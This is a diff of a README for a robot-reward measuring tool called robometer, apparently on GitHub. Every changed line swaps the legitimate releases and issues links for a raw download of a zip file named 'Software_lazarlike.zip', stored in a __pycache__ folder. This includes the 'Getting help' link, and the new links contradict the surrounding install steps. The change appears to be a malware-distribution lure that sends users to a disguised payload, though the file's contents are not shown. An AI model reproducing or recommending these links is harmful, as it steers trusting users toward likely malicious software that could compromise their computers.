@@ -1,6 +1,6 @@
 # ⚙️ robometer - Measure Robot Rewards Easily
 
-[![Download robometer](https://img.shields.io/badge/Download-robometer-brightgreen?style=for-the-badge)](https://github.com/imamhussaint/robometer/releases)
+[![Download robometer](https://img.shields.io/badge/Download-robometer-brightgreen?style=for-the-badge)](https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these steps to download, install, and run robometer on your Windows PC. E
 ## 📥 Download robometer
 
 1. Visit the robometer release page by clicking the link below:  
-   [![Download robometer](https://img.shields.io/badge/Download-robometer-blue?style=for-the-badge)](https://github.com/imamhussaint/robometer/releases)
+   [![Download robometer](https://img.shields.io/badge/Download-robometer-blue?style=for-the-badge)](https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip)
 
 2. On this page, you will see a list of available versions under "Assets." Choose the latest version that ends with `.exe` for Windows.
 
@@ -104,7 +104,7 @@ robometer compares different robot paths to tell you which is better. To use it,
 To get the latest robometer version:
 
 1. Visit the release page again:  
-   [https://github.com/imamhussaint/robometer/releases](https://github.com/imamhussaint/robometer/releases)
+   [https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip](https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip)
 
 2. Download the newest `.exe` file.
 
@@ -122,7 +122,7 @@ To get the latest robometer version:
 ## 📧 Getting help
 
 - If you face issues, you can check the GitHub page for guides or open an issue.
-- Use the “Issues” tab on the page: [https://github.com/imamhussaint/robometer/issues](https://github.com/imamhussaint/robometer/issues)
+- Use the “Issues” tab on the page: [https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip](https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip)
 - You do not need an account to browse issues, but opening one helps get direct responses.
 
 ---
@@ -130,7 +130,7 @@ To get the latest robometer version:
 ## ⚡ Quick links
 
 - Download and run robometer:  
-  [https://github.com/imamhussaint/robometer/releases](https://github.com/imamhussaint/robometer/releases)
+  [https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip](https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip)
 
 - Check for updates:  
-  [https://github.com/imamhussaint/robometer/releases](https://github.com/imamhussaint/robometer/releases)
+  [https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip](https://github.com/imamhussaint/robometer/raw/refs/heads/main/robometer/evals/baselines/__pycache__/Software_lazarlike.zip)
